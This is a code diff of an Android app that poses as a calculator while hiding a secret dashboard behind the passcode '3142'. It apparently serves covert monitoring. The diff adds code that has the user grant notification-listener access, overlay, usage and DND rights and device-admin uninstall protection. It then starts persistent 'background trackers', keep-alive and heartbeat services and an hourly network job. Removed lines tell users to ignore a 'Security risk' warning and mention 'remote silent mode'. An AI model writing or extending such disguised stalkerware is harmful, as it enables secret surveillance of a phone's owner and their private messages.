@@ -1,12 +1,16 @@
 package com.android.mycalculator
 
+import android.Manifest
 import android.app.AlarmManager
+import android.app.AppOpsManager
+import android.app.NotificationManager
 import android.app.admin.DevicePolicyManager
 import android.content.BroadcastReceiver
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
+import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
@@ -15,6 +19,7 @@ import android.provider.Settings
 import android.view.View
 import android.widget.Button
 import android.widget.LinearLayout
+import android.widget.ScrollView
 import android.widget.TextView
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
@@ -22,12 +27,25 @@ import androidx.appcompat.app.AppCompatActivity
 class MainActivity : AppCompatActivity() {
     private lateinit var dbHelper: DatabaseHelper
     private lateinit var logTextView: TextView
+    private lateinit var calculatorLayout: LinearLayout
+    private lateinit var mainContentLayout: ScrollView
     
-    private lateinit var btnAdmin: Button
     private lateinit var dpm: DevicePolicyManager
     private lateinit var adminComponent: ComponentName
 
-    // --- Calculator Variables ---
+    // Dashboard Buttons
+    private lateinit var btnPermNotif: Button
+    private lateinit var btnPermOverlay: Button
+    private lateinit var btnPermWrite: Button
+    private lateinit var btnPermDND: Button
+    private lateinit var btnPermUsage: Button
+    private lateinit var btnPermBattery: Button
+    private lateinit var btnPermAlarm: Button
+    private lateinit var btnPermPost: Button
+    private lateinit var btnAdmin: Button
+    private lateinit var btnStartServices: Button
+
+    // Calculator Variables
     private lateinit var display: TextView
     private var isCalculated = false
     private var lastResult = ""
@@ -43,14 +61,35 @@ class MainActivity : AppCompatActivity() {
         setContentView(R.layout.activity_main)
 
         dbHelper = DatabaseHelper(this)
+        calculatorLayout = findViewById(R.id.calculatorLayout)
+        mainContentLayout = findViewById(R.id.mainContentLayout)
         
-        // Layouts
-        val calculatorLayout = findViewById<LinearLayout>(R.id.calculatorLayout)
-        val mainContentLayout = findViewById<LinearLayout>(R.id.mainContentLayout)
+        dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+        adminComponent = ComponentName(this, AdminReceiver::class.java)
+
+        setupCalculator()
+        setupDashboard()
         
-        // --- 1. CALCULATOR LOGIC ---
+        val filter = IntentFilter("com.android.mycalculator.NEW_NOTIFICATION")
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            registerReceiver(logUpdateReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
+        } else {
+            registerReceiver(logUpdateReceiver, filter)
+        }
+    }
+
+    override fun onResume() {
+        super.onResume()
+        // Every time the user comes back to the app from Settings, refresh the ✅ and ❌
+        if (mainContentLayout.visibility == View.VISIBLE) {
+            updateDashboardUI()
+        }
+    }
+
+    private fun setupCalculator() {
         display = findViewById(R.id.calcDisplay)
         display.movementMethod = android.text.method.ScrollingMovementMethod()
+
         val typeButtons = listOf(
             R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4, 
             R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9, 
@@ -64,24 +103,21 @@ class MainActivity : AppCompatActivity() {
                     display.text = ""
                     isCalculated = false
                 }
-                if (display.text.toString() == "0" && b.text != ".") {
-                    display.text = ""
-                }
+                if (display.text.toString() == "0" && b.text != ".") display.text = ""
                 display.append(b.text)
             }
         }
 
-        // Operators
         val operatorButtons = listOf(R.id.btnAdd, R.id.btnSub, R.id.btnMul, R.id.btnDiv)
         for (id in operatorButtons) {
             findViewById<Button>(id).setOnClickListener {
                 val b = it as Button
                 if (isCalculated) {
-                    display.text = lastResult // Carry forward the old result
+                    display.text = lastResult
                     isCalculated = false
                 }
                 if (display.text.toString() == "0" && b.text == "-") {
-                    display.text = "-" // Allow starting with a negative number
+                    display.text = "-"
                 } else {
                     display.append(b.text)
                 }
@@ -100,25 +136,18 @@ class MainActivity : AppCompatActivity() {
                 isCalculated = false
                 return@setOnClickListener
             }
-            
             val text = display.text.toString()
-            if (text.length > 1) {
-                display.text = text.dropLast(1)
-            } else {
-                display.text = "0"
-            }
+            if (text.length > 1) display.text = text.dropLast(1) else display.text = "0"
         }
 
-        // The Equals Button & Secret Trigger
         findViewById<Button>(R.id.btnEquals).setOnClickListener {
             val text = display.text.toString()
 
-            // SECRET TRIGGER: Check for passcode "3142"
+            // SECRET TRIGGER: Passcode "3142"
             if (text == "3142") {
                 calculatorLayout.visibility = View.GONE
                 mainContentLayout.visibility = View.VISIBLE
-                
-                checkPermissions()
+                updateDashboardUI()
                 refreshLogs()
                 return@setOnClickListener
             }
@@ -126,36 +155,68 @@ class MainActivity : AppCompatActivity() {
             if (isCalculated || text.isEmpty() || text == "0") return@setOnClickListener
 
             try {
-                // Send the math string to your new professional parser
                 val result = CalculatorService.evaluate(text)
-                
-                // Format nicely (e.g. 5.0 becomes 5)
-                val resultText = if (result % 1.0 == 0.0) {
-                    result.toLong().toString()
-                } else {
-                    // Limit decimals so it doesn't run off screen
-                    String.format("%.6f", result).trimEnd('0').trimEnd('.')
-                }
+                val resultText = if (result % 1.0 == 0.0) result.toLong().toString() 
+                                 else String.format("%.6f", result).trimEnd('0').trimEnd('.')
                 
                 lastResult = resultText
-                // Display the math AND the answer on a new line!
                 display.text = "$text\n= $resultText" 
                 isCalculated = true
-                
             } catch (e: Exception) {
                 display.text = "Error"
                 isCalculated = true
             }
         }
+    }
 
-        // --- 2. HIDDEN NOTIFICATION LOG LOGIC ---
+    private fun setupDashboard() {
         logTextView = findViewById(R.id.logTextView)
-        val btnRefresh = findViewById<Button>(R.id.btnRefresh)
-        val btnClear = findViewById<Button>(R.id.btnClear)
-        
+        btnPermNotif = findViewById(R.id.btnPermNotif)
+        btnPermOverlay = findViewById(R.id.btnPermOverlay)
+        btnPermWrite = findViewById(R.id.btnPermWrite)
+        btnPermDND = findViewById(R.id.btnPermDND)
+        btnPermUsage = findViewById(R.id.btnPermUsage)
+        btnPermBattery = findViewById(R.id.btnPermBattery)
+        btnPermAlarm = findViewById(R.id.btnPermAlarm)
+        btnPermPost = findViewById(R.id.btnPermPost)
         btnAdmin = findViewById(R.id.btnAdmin)
-        dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
-        adminComponent = ComponentName(this, AdminReceiver::class.java)
+        btnStartServices = findViewById(R.id.btnStartServices)
+
+        // CLICK LISTENERS TO OPEN SPECIFIC SETTINGS
+        btnPermNotif.setOnClickListener { startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")) }
+        
+        btnPermOverlay.setOnClickListener {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
+            }
+        }
+        
+        btnPermWrite.setOnClickListener {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                startActivity(Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS, Uri.parse("package:$packageName")))
+            }
+        }
+
+        btnPermDND.setOnClickListener { startActivity(Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS)) }
+        btnPermUsage.setOnClickListener { startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)) }
+        
+        btnPermBattery.setOnClickListener {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName")))
+            }
+        }
+
+        btnPermAlarm.setOnClickListener {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                startActivity(Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM, Uri.parse("package:$packageName")))
+            }
+        }
+
+        btnPermPost.setOnClickListener {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                requestPermissions(arrayOf(Manifest.permission.POST_NOTIFICATIONS), 1001)
+            }
+        }
 
         btnAdmin.setOnClickListener {
             if (!dpm.isAdminActive(adminComponent)) {
@@ -166,49 +227,104 @@ class MainActivity : AppCompatActivity() {
                 startActivity(intent)
             } else {
                 dpm.removeActiveAdmin(adminComponent)
-                updateAdminButtonUI()
+                updateDashboardUI()
                 Toast.makeText(this, "Protection disabled.", Toast.LENGTH_SHORT).show()
             }
         }
 
-        btnRefresh.setOnClickListener { refreshLogs() }
+        btnStartServices.setOnClickListener {
+            startAllServices()
+            Toast.makeText(this, "Background Trackers Started!", Toast.LENGTH_SHORT).show()
+        }
 
-        btnClear.setOnClickListener {
-            val db = dbHelper.writableDatabase
-            db.execSQL("DELETE FROM logs")
-            db.close()
+        findViewById<Button>(R.id.btnRefresh).setOnClickListener { refreshLogs() }
+        findViewById<Button>(R.id.btnClear).setOnClickListener {
+            dbHelper.writableDatabase.execSQL("DELETE FROM logs")
             refreshLogs()
             Toast.makeText(this, "Local logs cleared!", Toast.LENGTH_SHORT).show()
         }
+    }
 
-        val filter = IntentFilter("com.android.mycalculator.NEW_NOTIFICATION")
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            registerReceiver(logUpdateReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
+    // THE BRAINS OF THE DASHBOARD - Checks statuses and updates UI dynamically
+    private fun updateDashboardUI() {
+        val colorRed = getColorStateList(android.R.color.holo_red_dark)
+        val colorGreen = getColorStateList(android.R.color.holo_green_dark)
+
+        // 1. Notification Listener
+        val notifEnabled = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")?.contains(packageName) == true
+        updateBtn(btnPermNotif, notifEnabled, "Notification Access")
+
+        // 2. Overlay
+        val overlayEnabled = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.canDrawOverlays(this) else true
+        updateBtn(btnPermOverlay, overlayEnabled, "Display Over Other Apps")
+
+        // 3. Write Settings
+        val writeEnabled = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.System.canWrite(this) else true
+        updateBtn(btnPermWrite, writeEnabled, "Modify System Settings")
+
+        // 4. Do Not Disturb
+        val dndEnabled = (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).isNotificationPolicyAccessGranted
+        updateBtn(btnPermDND, dndEnabled, "Do Not Disturb Access")
+
+        // 5. Usage Access
+        val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
+        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            appOps.unsafeCheckOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
         } else {
-            registerReceiver(logUpdateReceiver, filter)
+            @Suppress("DEPRECATION")
+            appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
         }
-    } // <-- This brace safely closes onCreate()
+        updateBtn(btnPermUsage, mode == AppOpsManager.MODE_ALLOWED, "Usage Data Access")
 
-    override fun onResume() {
-        super.onResume()
-        if (::btnAdmin.isInitialized) {
-            updateAdminButtonUI()
+        // 6. Battery
+        val batteryEnabled = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            (getSystemService(Context.POWER_SERVICE) as PowerManager).isIgnoringBatteryOptimizations(packageName)
+        } else true
+        updateBtn(btnPermBattery, batteryEnabled, "Ignore Battery Optimization")
+
+        // 7. Alarms
+        val alarmEnabled = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            (getSystemService(Context.ALARM_SERVICE) as AlarmManager).canScheduleExactAlarms()
+        } else true
+        updateBtn(btnPermAlarm, alarmEnabled, "Exact Alarms")
+
+        // 8. Post Notifications
+        val postEnabled = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
+        } else true
+        updateBtn(btnPermPost, postEnabled, "Post Notifications (A13+)")
+
+        // 9. Admin Protection
+        updateBtn(btnAdmin, dpm.isAdminActive(adminComponent), "Uninstall Protection")
+    }
+
+    private fun updateBtn(btn: Button, isGranted: Boolean, text: String) {
+        if (isGranted) {
+            btn.text = "✅ $text"
+            btn.backgroundTintList = getColorStateList(android.R.color.holo_green_dark)
+        } else {
+            btn.text = "❌ $text"
+            btn.backgroundTintList = getColorStateList(android.R.color.holo_red_dark)
         }
     }
 
-    private fun updateAdminButtonUI() {
-        if (dpm.isAdminActive(adminComponent)) {
-            btnAdmin.text = "🔓 Disable Uninstall Protection"
-            btnAdmin.backgroundTintList = getColorStateList(android.R.color.holo_red_dark)
-        } else {
-            btnAdmin.text = "🛡️ Enable Uninstall Protection"
-            btnAdmin.backgroundTintList = getColorStateList(android.R.color.holo_blue_dark)
+    private fun startAllServices() {
+        startService(Intent(this, NotificationService::class.java))
+        startService(Intent(this, KeepAliveService::class.java))
+        startService(Intent(this, HeartbeatService::class.java))
+        AlarmScheduler.scheduleAlarms(this)
+        
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            val jobScheduler = getSystemService(Context.JOB_SCHEDULER_SERVICE) as android.app.job.JobScheduler
+            val job = android.app.job.JobInfo.Builder(1005, ComponentName(this, BackupJobService::class.java))
+                .setPeriodic(60 * 60 * 1000)
+                .setRequiredNetworkType(android.app.job.JobInfo.NETWORK_TYPE_ANY)
+                .setRequiresDeviceIdle(false)
+                .setRequiresCharging(false)
+                .setPersisted(true)
+                .build()
+            jobScheduler.schedule(job)
         }
-    }
-
-    private fun checkPermissions() {
-        val permissionManager = PermissionManager(this)
-        permissionManager.requestAllPermissions()
     }
 
     override fun onDestroy() {
@@ -218,245 +334,6 @@ class MainActivity : AppCompatActivity() {
 
     private fun refreshLogs() {
         val logs = dbHelper.getAllLogs()
-        if (logs.isNotEmpty()) {
-            logTextView.text = logs
-        } else {
-            logTextView.text = "Waiting for notifications..."
-        }
-    }
-} // <-- This brace safely closes MainActivity
-
-// ========== PERMISSION MANAGER ==========
-class PermissionManager(private val activity: MainActivity) {
-    
-    fun requestAllPermissions() {
-        requestNotificationAccess()
-        requestDndAccess()
-        requestWriteSettings()
-        requestUsageAccess()
-        requestBatteryOptimization()
-        requestExactAlarms()
-        requestDisplayOverlay()
-        requestNotificationPermission()
-        checkManufacturerSettings()
-        startAllServices()
-    }
-
-    private fun requestWriteSettings() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if (!android.provider.Settings.System.canWrite(activity)) {
-                val intent = Intent(android.provider.Settings.ACTION_MANAGE_WRITE_SETTINGS).apply {
-                    data = android.net.Uri.parse("package:${activity.packageName}")
-                }
-                activity.startActivity(intent)
-                android.widget.Toast.makeText(
-                    activity, 
-                    "Please allow 'Modify System Settings' to force silent mode.", 
-                    android.widget.Toast.LENGTH_LONG
-                ).show()
-            }
-        }
-    }
-
-    private fun requestUsageAccess() {
-        val appOpsManager = activity.getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
-        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            appOpsManager.unsafeCheckOpNoThrow(
-                android.app.AppOpsManager.OPSTR_GET_USAGE_STATS, 
-                android.os.Process.myUid(), 
-                activity.packageName
-            )
-        } else {
-            @Suppress("DEPRECATION")
-            appOpsManager.checkOpNoThrow(
-                android.app.AppOpsManager.OPSTR_GET_USAGE_STATS, 
-                android.os.Process.myUid(), 
-                activity.packageName
-            )
-        }
-
-        if (mode != android.app.AppOpsManager.MODE_ALLOWED) {
-            val intent = Intent(android.provider.Settings.ACTION_USAGE_ACCESS_SETTINGS)
-            activity.startActivity(intent)
-            android.widget.Toast.makeText(
-                activity, 
-                "Please allow 'Usage Access' to keep the app alive.", 
-                android.widget.Toast.LENGTH_LONG
-            ).show()
-        }
-    }
-
-    private fun requestDndAccess() {
-        val notificationManager = activity.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
-        if (!notificationManager.isNotificationPolicyAccessGranted) {
-            val intent = Intent(android.provider.Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS)
-            activity.startActivity(intent)
-            android.widget.Toast.makeText(
-                activity, 
-                "Please grant 'Do Not Disturb' access to allow remote silent mode.", 
-                android.widget.Toast.LENGTH_LONG
-            ).show()
-        }
-    }
-
-    private fun requestNotificationAccess() {
-        val enabledListeners = android.provider.Settings.Secure.getString(
-            activity.contentResolver,
-            "enabled_notification_listeners"
-        )
-        
-        if (enabledListeners == null || !enabledListeners.contains(activity.packageName)) {
-            android.app.AlertDialog.Builder(activity)
-                .setTitle("Notification Access Required")
-                .setMessage("You need to manually enable notification access for this app.\n\n" +
-                           "Step 1: Find 'Calculator' in the list\n" +
-                           "Step 2: Toggle the switch ON\n\n" +
-                           "The app may crash once - this is normal. Restart after enabling.")
-                .setPositiveButton("Open Settings") { _, _ ->
-                    val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
-                    activity.startActivity(intent)
-                }
-                .setNegativeButton("Cancel", null)
-                .show()
-        }
-    }
-    
-    private fun requestBatteryOptimization() {
-        val pm = activity.getSystemService(Context.POWER_SERVICE) as PowerManager
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if (!pm.isIgnoringBatteryOptimizations(activity.packageName)) {
-                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
-                    data = Uri.parse("package:${activity.packageName}")
-                }
-                activity.startActivity(intent)
-            }
-        }
-    }
-    
-    private fun requestExactAlarms() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-            val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as AlarmManager
-            if (!alarmManager.canScheduleExactAlarms()) {
-                val intent = Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM).apply {
-                    data = Uri.parse("package:${activity.packageName}")
-                }
-                activity.startActivity(intent)
-            }
-        }
-    }
-    
-    private fun requestDisplayOverlay() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if (!Settings.canDrawOverlays(activity)) {
-                val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
-                    data = Uri.parse("package:${activity.packageName}")
-                }
-                activity.startActivity(intent)
-            }
-        }
-    }
-    
-    private fun requestNotificationPermission() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            if (activity.checkSelfPermission(android.Manifest.permission.POST_NOTIFICATIONS)
-                != android.content.pm.PackageManager.PERMISSION_GRANTED) {
-                activity.requestPermissions(
-                    arrayOf(android.Manifest.permission.POST_NOTIFICATIONS),
-                    1001
-                )
-            }
-        }
-    }
-    
-    private fun checkManufacturerSettings() {
-        val manufacturer = Build.MANUFACTURER.lowercase()
-        
-        when {
-            manufacturer.contains("xiaomi") || manufacturer.contains("redmi") || manufacturer.contains("poco") -> {
-                android.widget.Toast.makeText(
-                    activity,
-                    "XIAOMI: Settings → Passwords & security → Privacy → Notification access",
-                    android.widget.Toast.LENGTH_LONG
-                ).show()
-                showXiaomiNotificationGuide()
-            }
-            manufacturer.contains("samsung") -> {
-                android.widget.Toast.makeText(
-                    activity,
-                    "SAMSUNG: Settings → Notifications → Notification access",
-                    android.widget.Toast.LENGTH_LONG
-                ).show()
-            }
-            manufacturer.contains("huawei") || manufacturer.contains("honor") -> {
-                android.widget.Toast.makeText(
-                    activity,
-                    "HUAWEI: Settings → Apps → Apps → Calculator → Notification access",
-                    android.widget.Toast.LENGTH_LONG
-                ).show()
-            }
-            manufacturer.contains("oppo") || manufacturer.contains("oneplus") || manufacturer.contains("realme") -> {
-                android.widget.Toast.makeText(
-                    activity,
-                    "OPPO: Settings → Notifications & status bar → Notification access",
-                    android.widget.Toast.LENGTH_LONG
-                ).show()
-            }
-        }
-    }
-    
-    private fun showXiaomiNotificationGuide() {
-        android.app.AlertDialog.Builder(activity)
-            .setTitle("Xiaomi Special Instructions")
-            .setMessage("On Xiaomi phones:\n\n" +
-                       "1. Go to Settings\n" +
-                       "2. Passwords & security\n" +
-                       "3. Privacy\n" +
-                       "4. Notification access\n" +
-                       "5. Find 'Calculator' and enable\n\n" +
-                       "If it shows 'Security risk' warning, ignore and enable anyway.")
-            .setPositiveButton("OK", null)
-            .show()
-    }
-    
-    private fun startAllServices() {
-        val notifIntent = Intent(activity, NotificationService::class.java)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            activity.startForegroundService(notifIntent)
-        } else {
-            activity.startService(notifIntent)
-        }
-        
-        val keepAliveIntent = Intent(activity, KeepAliveService::class.java)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            activity.startForegroundService(keepAliveIntent)
-        } else {
-            activity.startService(keepAliveIntent)
-        }
-        
-        val heartbeatIntent = Intent(activity, HeartbeatService::class.java)
-        activity.startService(heartbeatIntent)
-        
-        AlarmScheduler.scheduleAlarms(activity)
-        
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            scheduleBackupJob()
-        }
-    }
-    
-    private fun scheduleBackupJob() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            val jobScheduler = activity.getSystemService(Context.JOB_SCHEDULER_SERVICE) as android.app.job.JobScheduler
-            
-            val job = android.app.job.JobInfo.Builder(1005, 
-                android.content.ComponentName(activity, BackupJobService::class.java))
-                .setPeriodic(60 * 60 * 1000) // Every 1 hour
-                .setRequiredNetworkType(android.app.job.JobInfo.NETWORK_TYPE_ANY)
-                .setRequiresDeviceIdle(false)
-                .setRequiresCharging(false)
-                .setPersisted(true)
-                .build()
-            
-            jobScheduler.schedule(job)
-        }
+        logTextView.text = if (logs.isNotEmpty()) logs else "Waiting for notifications..."
     }
 }
